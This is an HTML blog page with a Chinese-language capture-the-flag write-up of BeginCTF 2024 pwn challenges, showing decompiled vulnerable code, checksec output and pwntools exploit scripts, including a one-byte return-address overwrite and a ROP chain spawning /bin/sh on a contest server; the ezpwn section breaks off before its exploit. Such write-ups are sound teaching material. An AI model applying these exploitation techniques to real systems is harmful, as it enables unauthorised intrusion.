<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>2024-BeginCTF-Pwn | 晚栀wingee~</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="引言： 2024BeginCTF，Pwn方向部分题解，包括one_byte，unhappy，gift_rop，ezpwn，no_money。因为放假了所以没怎么认真打.....但还是学到了一些东西滴~">
<meta property="og:type" content="article">
<meta property="og:title" content="2024-BeginCTF-Pwn">
<meta property="og:url" content="http://47.96.29.144/2024/02/06/2023-BeginCTF-Pwn/index.html">
<meta property="og:site_name" content="晚栀wingee~">
<meta property="og:description" content="引言： 2024BeginCTF，Pwn方向部分题解，包括one_byte，unhappy，gift_rop，ezpwn，no_money。因为放假了所以没怎么认真打.....但还是学到了一些东西滴~">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://47.96.29.144/2024/02/06/2023-BeginCTF-Pwn/image-20240206163101593.png">
<meta property="og:image" content="http://47.96.29.144/2024/02/06/2023-BeginCTF-Pwn/image-20240206164116896.png">
<meta property="og:image" content="http://47.96.29.144/2024/02/06/2023-BeginCTF-Pwn/image-20240206165300181.png">
<meta property="og:image" content="http://47.96.29.144/2024/02/06/2023-BeginCTF-Pwn/image-20240206165509326.png">
<meta property="og:image" content="http://47.96.29.144/2024/02/06/2023-BeginCTF-Pwn/image-20240206172628596.png">
<meta property="og:image" content="http://47.96.29.144/2024/02/06/2023-BeginCTF-Pwn/image-20240206172804734.png">
<meta property="article:published_time" content="2024-02-06T08:05:50.000Z">
<meta property="article:modified_time" content="2024-02-06T09:42:15.129Z">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="BeginCTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://47.96.29.144/2024/02/06/2023-BeginCTF-Pwn/image-20240206163101593.png">
  
    <link rel="alternative" href="/atom.xml" title="晚栀wingee~" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/avatar.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 7.0.0"><style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
				<img lazy-src="/img/avatar.jpg" class="js-avatar">
			
		</a>

		<hgroup>
			<h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">Home</a></li>
				        
							<li><a href="/archives">Archives</a></li>
				        
							<li><a href="/introduction">关于我</a></li>
				        
							<li><a href="/pp">晚栀的书房(building)</a></li>
				        
							<li><a href="/log">运维日志</a></li>
				        
						</ul>
					</nav>
					<nav class="half-header-menu">
						<a class="hide">Home</a>
						<a>Tags</a>
						<a>Links</a>
						<a>About</a>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="github" target="_blank" href="https://github.com/wing3e" title="github">github</a>
					        
								<a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
					        
						</div>
						<!-- music -->
						
							<!-- <div style="position: absolute; bottom: 120px; left: auto; width: 85%;"> -->
							<div style="position: absolute; left: auto; width: 85%;">
								<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=220 height=86 src="//music.163.com/outchain/player?type=2&id=1830685896&auto=1&height=66"></iframe>
							</div>
						
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/BeginCTF/" style="font-size: 10px;">BeginCTF</a> <a href="/tags/Pwn/" style="font-size: 14px;">Pwn</a> <a href="/tags/Reverse/" style="font-size: 12px;">Reverse</a> <a href="/tags/ZJUCTF/" style="font-size: 12px;">ZJUCTF</a> <a href="/tags/%E5%AE%89%E6%B4%B5%E6%9D%AF/" style="font-size: 10px;">安洵杯</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 10px;">密码学</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 16px;">操作系统</a> <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="font-size: 18px;">数学建模</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/" style="font-size: 12px;">计算机体系结构</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FII/" style="font-size: 20px;">计算机系统II</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://note.jiepeng.tech/">JPGG&#39;s NoteBook</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://47.99.33.238/">Tauhkc&#39;s Note</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://xymmsnotebook.gitbook.io/noteofxymm/">xy猫猫</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://121.40.230.233:3303/">CCnocc</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://hzeroyuke.github.io/my_blog/">华零的Notebook</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://miraclemaster.cn/">恩浩gg</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://116.62.208.33/">SLXjj没想好的标题</a>
			        
			        </div>
				</section>
				

				
				
				<section class="switch-part switch-part4">
				
					<div id="js-aboutme">aaa</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="/img/avatar.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">Home</a></li>
		        
					<li><a href="/archives">Archives</a></li>
		        
					<li><a href="/introduction">关于我</a></li>
		        
					<li><a href="/pp">晚栀的书房(building)</a></li>
		        
					<li><a href="/log">运维日志</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/wing3e" title="github">github</a>
			        
						<a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap"><article id="post-2023-BeginCTF-Pwn" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/02/06/2023-BeginCTF-Pwn/" class="article-date">
  	<time datetime="2024-02-06T08:05:50.000Z" itemprop="datePublished">2024-02-06</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      2024-BeginCTF-Pwn
      
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/BeginCTF/" rel="tag">BeginCTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
	</div>

        
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/CTF/">CTF</a>
	</div>


        
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<h3 id="引言">引言：</h3>
<p>2024BeginCTF，Pwn方向部分题解，包括one_byte，unhappy，gift_rop，ezpwn，no_money。因为放假了所以没怎么认真打.....但还是学到了一些东西滴~</p>
<span id="more"></span>
<h3 id="one_byte">1 one_byte</h3>
<p>检查文件，没有canary的栈保护，可能是简单的单字节溢出</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wingee<span class="keyword">@LAPTOP-</span><span class="number">1</span><span class="attribute">THOKMAC</span>:~/Pwn&amp;Reverse/Begin/one_byte$ checksec one_byte</span><br><span class="line">[*] <span class="string">'/home/wingee/Pwn&amp;Reverse/Begin/one_byte/one_byte'</span></span><br><span class="line">    <span class="attribute">Arch</span>:     amd64-<span class="number">64</span>-little</span><br><span class="line">    <span class="attribute">RELRO</span>:    Full RELRO</span><br><span class="line">    <span class="attribute">Stack</span>:    No canary found</span><br><span class="line">    <span class="attribute">NX</span>:       NX enabled</span><br><span class="line">    <span class="attribute">PIE</span>:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>丢进IDA查看，发现溢出点：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">8</span>]; <span class="comment">// [rsp+7h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+Fh] [rbp-1h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to beginctf!"</span>);</span><br><span class="line">  open(<span class="string">"flag"</span>, <span class="number">0</span>);</span><br><span class="line">  read(<span class="number">3</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Here is your gift: %c\n"</span>, (<span class="type">unsigned</span> <span class="type">int</span>)buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Are you satisfied with the result?"</span>);</span><br><span class="line">  read(<span class="number">0</span>, v4, <span class="number">0x12</span>uLL); <span class="comment">// 这里有单字节溢出</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>其中，<code>open</code>语句没有直接返回值，则默认<code>3</code>为标准文件输出流管道，<code>read</code>语句表示从该文件中读取一个字节，并将文件指针向后移动指定字节数。</p>
<p>通过本地调试可以得知main函数运行一次可以输出flag中的一个字符，那那么本题的关键点在于如何使得main函数可以多次运行。</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wingee@LAPTOP-<span class="number">1</span>THOKMAC:~/Pwn&amp;<span class="keyword">Reverse</span>/<span class="keyword">Begin</span>/one_byte$ ./one_byte</span><br><span class="line">Welcome <span class="keyword">to</span> beginctf!</span><br><span class="line">Here <span class="keyword">is</span> your gift: <span class="number">1</span></span><br><span class="line">Are you satisfied <span class="keyword">with</span> the <span class="keyword">result</span>?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>结合题目给的libc，修改main返回地址的低字节让main返回到</p>
<p><code>call %rax</code>（call main）语句之前，使得程序再次运行main函数。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"101.32.220.189"</span>, <span class="number">30530</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b""</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    payload = <span class="string">b"a"</span> * <span class="number">0x11</span> + <span class="string">b"\x76"</span></span><br><span class="line">    p.recvuntil(<span class="string">b"Here is your gift: "</span>)</span><br><span class="line">    flag += p.recv(<span class="number">1</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>本地运行效果：</p>
<p><img src="/2024/02/06/2023-BeginCTF-Pwn/image-20240206163101593.png"></p>
<h3 id="gift_rop">2 gift_rop</h3>
<p>检查文件：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wingee<span class="keyword">@LAPTOP-</span><span class="number">1</span><span class="attribute">THOKMAC</span>:~/Pwn&amp;Reverse/Begin/gift_rop$ checksec gift_rop</span><br><span class="line">[*] <span class="string">'/home/wingee/Pwn&amp;Reverse/Begin/gift_rop/gift_rop'</span></span><br><span class="line">    <span class="attribute">Arch</span>:     amd64-<span class="number">64</span>-little</span><br><span class="line">    <span class="attribute">RELRO</span>:    Partial RELRO</span><br><span class="line">    <span class="attribute">Stack</span>:    Canary found</span><br><span class="line">    <span class="attribute">NX</span>:       NX enabled</span><br><span class="line">    <span class="attribute">PIE</span>:      No PIE (<span class="number">0</span>x400000)</span><br></pre></td></tr></table></figure>
<p>没有PIE，结合题目名字，应该是简单的rop</p>
<p>扔进IDA发现是静态链接的程序，那就直接搞rop-chain</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>((__int64)<span class="string">"Welcome to beginCTF!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>((__int64)<span class="string">"This is a fake(real) checkin problem."</span>);</span><br><span class="line">  read(<span class="number">0</span>, v4, <span class="number">0x200</span>uLL);</span><br><span class="line">  close(<span class="number">1LL</span>);</span><br><span class="line">  close(<span class="number">2LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>观察到程序关闭了标准输出流通道，和标准错误输出流通道。需要我们在获取shell的时候对标准输出流进行重定位。</p>
<p>EXP如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">"101.32.220.189"</span>, <span class="number">30226</span>)</span><br><span class="line"><span class="comment"># conn = process("./gift_rop")</span></span><br><span class="line"><span class="comment"># gdb.attach(conn, "b main")</span></span><br><span class="line"><span class="comment"># 0x000000000040101a : ret</span></span><br><span class="line"><span class="comment"># p += p64(0)</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">b''</span></span><br><span class="line">p += <span class="string">b"A"</span> * <span class="number">40</span></span><br><span class="line">p += p64(<span class="number">0x40101a</span>)</span><br><span class="line">p += p64(<span class="number">0x0000000000409f9e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004c50e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += p64(<span class="number">0x0000000000448077</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b'/bin/sh\x00'</span></span><br><span class="line">p += p64(<span class="number">0x000000000044a4f5</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line"> ; ret</span><br><span class="line">p += p64(<span class="number">0x0000000000401f2f</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004c50e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += p64(<span class="number">0x0000000000409f9e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p += p64(<span class="number">0x000000000047f20b</span>) <span class="comment"># pop rdx ; pop rbx ; ret</span></span><br><span class="line">p += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p += p64(<span class="number">0x000000000043d1d0</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line"></span><br><span class="line">p += p64(<span class="number">0x000000000041315f</span>)</span><br><span class="line">p += p64(<span class="number">0x0000000000471270</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000401ce4</span>) <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.send(p)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
<p>执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag 1&gt;&amp;0</span><br></pre></td></tr></table></figure>
<p>将标准输出流的重定向到标准输入流管道中进行输出</p>
<h3 id="ezpwn">3 ezpwn</h3>
<p>非常简单的单字节溢出</p>
<p>检查文件</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wingee<span class="keyword">@LAPTOP-</span><span class="number">1</span><span class="attribute">THOKMAC</span>:~/Pwn&amp;Reverse/Begin/ezpwn$ checksec ezpwn</span><br><span class="line">[*] <span class="string">'/home/wingee/Pwn&amp;Reverse/Begin/ezpwn/ezpwn'</span></span><br><span class="line">    <span class="attribute">Arch</span>:     amd64-<span class="number">64</span>-little</span><br><span class="line">    <span class="attribute">RELRO</span>:    Full RELRO</span><br><span class="line">    <span class="attribute">Stack</span>:    Canary found</span><br><span class="line">    <span class="attribute">NX</span>:       NX enabled</span><br><span class="line">    <span class="attribute">PIE</span>:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>保护全开，扔进IDA，在main_loop里面发现溢出点：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">main_loop</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+7h] [rbp-229h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-228h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-224h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+10h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">224</span>]; <span class="comment">// [rsp+40h] [rbp-1F0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> command[<span class="number">264</span>]; <span class="comment">// [rsp+120h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+228h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Welcome to beginctf 2024."</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"This is a checkin pwn challenge."</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Just play for fun."</span>);</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v3);</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= <span class="number">4</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">switch</span> ( v3 )</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          filemanage();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Please input index."</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"please input value"</span>);</span><br><span class="line">          v1 = getchar();</span><br><span class="line">          getchar();</span><br><span class="line">          s[v2] = v1; <span class="comment">// 数组越界</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">          <span class="built_in">memset</span>(command, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Please input your echo command"</span>);</span><br><span class="line">          read(<span class="number">0</span>, buf, <span class="number">0xE0</span>uLL);</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strchr</span>(buf, <span class="string">';'</span>)</span><br><span class="line">            || <span class="built_in">strchr</span>(buf, <span class="string">'`'</span>)</span><br><span class="line">            || <span class="built_in">strchr</span>(buf, <span class="string">'|'</span>)</span><br><span class="line">            || <span class="built_in">strchr</span>(buf, <span class="string">'/'</span>)</span><br><span class="line">            || <span class="built_in">strchr</span>(buf, <span class="string">'&amp;'</span>)</span><br><span class="line">            || <span class="built_in">strstr</span>(buf, <span class="string">"cat"</span>)</span><br><span class="line">            || <span class="built_in">strstr</span>(buf, <span class="string">"sh"</span>) )</span><br><span class="line">          {</span><br><span class="line">            perror(<span class="string">"Forbidden."</span>);</span><br><span class="line">            _exit(<span class="number">-1</span>);</span><br><span class="line">          }</span><br><span class="line">          <span class="built_in">snprintf</span>(command, <span class="number">0x100</span>uLL, <span class="string">"%s %s %s"</span>, <span class="string">"echo '"</span>, buf, <span class="string">"' string"</span>);</span><br><span class="line">          system(command);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> v7 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>经典的数组越界。观察到<code>gift</code>函数是程序的后门函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">gift</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><img src="/2024/02/06/2023-BeginCTF-Pwn/image-20240206164116896.png"></p>
<p>且main_loop的返回地址与gift函数的地址只有最低字节不同，可以考虑利用数组越界，修改main_loop函数返回地址的末尾字节为<code>0x49</code>，使得main_loop结束后跳转到gift执行后门函数。</p>
<p>exp:</p>
